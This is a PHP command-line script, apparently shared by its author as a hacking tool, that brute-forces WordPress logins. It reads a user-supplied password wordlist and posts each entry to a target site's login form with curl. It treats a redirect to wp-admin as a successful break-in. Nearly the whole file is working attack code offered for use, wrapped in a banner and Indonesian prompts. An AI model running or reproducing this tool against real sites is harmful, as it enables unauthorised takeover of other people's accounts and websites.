<?php

// Coded By Muhammad Imam
// Id Pm : U21004145

$yellow = "\e[1;33m";
$white = "\e[1;37m";
$green = "\e[0;32m";
$red = "\e[0;31m";
$imp = "\e[0;31m!\e[1;37m";
$plus = "\e[1;33m+\e[1;37m";
$lightblue = "\e[1;34m";

system("clear");
$banner1 = "$green
$white 💻 Coded By Muhammad Imam $green Team : Robh Official 
$white __      __      ___          _        __   $yellow Goblok $red
 \ \    / / __  | _ )_ _ _  _| |_ ___ / _|___ _ _ __ ___
  \ \/\/ / '_ \ | _ \ '_| || |  _/ -_)  _/ _ \ '_/ _/ -_)
   \_/\_/| .__/ |___/_|  \_,_|\__\___|_| \___/_| \__\___|
         |_|  $plus version : 1.x.x    Kalo Gambar Rusak Besarin Anjing

$imp$green Usage : php wpbrute.php
$imp$white Give Username ( Default Admin )
$imp$yellow File Wordlist ( TXT )

";
echo $banner1;


if ( file_exists("cookie-name.txt")){
        unlink("cookie-name.txt");
}



function jalan(){
global $red,$yellow,$imp,$plus,$white,$green;


$str = "$green Terima Kasih Telah Menggunakan Tools Saya || Tetap Semangat Menggapai Cita-Citamu
|| Contact Me 087700935379 Jika Ada Perlu
 - Prize0neZero \n";

foreach ( str_split($str) as $split ){

    echo $split . system("sleep 0.1");

}
}

function wpbrute($username,$password,$web){
$ch = curl_init();
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_URL,$web);
curl_setopt($ch, CURLOPT_POSTFIELDS,"log=$username&pwd=$password");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie-name.txt');  
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie-name.txt');

curl_exec($ch);

$mmk = curl_getinfo($ch);
return $mmk["url"];
}

function gasken(){

global $red,$yellow,$imp,$lightblue,$green,$white;

echo "$red Username  : ";
$username = trim(fgets(STDIN));

if ( empty($username)){
     die("$white [ $red ✖ $white ] Username Harus Diisi Goblok \n");
}

echo "$white File wordlist : ";
$password = strtolower(trim(fgets(STDIN)));

if ( empty($password)){
     die("$white [ $red ✖ $white ] Wordlist Harus Diisi Goblok \n");
}

$extensiValid = array("txt");
$passwordEx = explode(".",$password);
$passwordExten = end($passwordEx);


if ( !in_array($passwordExten,$extensiValid)){
      die("$white [ $red ✖ $white ] Extensi Wordlist Harus Txt\n");
} else {
$password = $password; 
}


echo "$lightblue Website : ";
$web = trim(fgets(STDIN));


if ( empty($web)){
     die("$white [ $red ✖ $white ] Website Harus Diisi Goblok \n");
}


$open = fopen($password,"r");
$size = filesize($password);
$baca = fread($open,$size);
$kntl = explode("\n",$baca);



foreach ( $kntl as $pass ){
$wp = wpbrute($username,$pass,$web);
if ( preg_match("/wp-admin/",$wp)){
      echo "
$white [ $green ✔️ $white ] $white Mencoba : $pass Status : $green Login Berhasil 
           \n";
      $result = 1;
   echo "\n";
     jalan();
  }
}
if ( $result == 0 ){
    echo "
$white [ $red ✖ $white ]$white Wordlist Tidak Ada Yang Cocok Status : $red Gagal\n";
 echo "\n";
 jalan();
 }
}
gasken();

?>
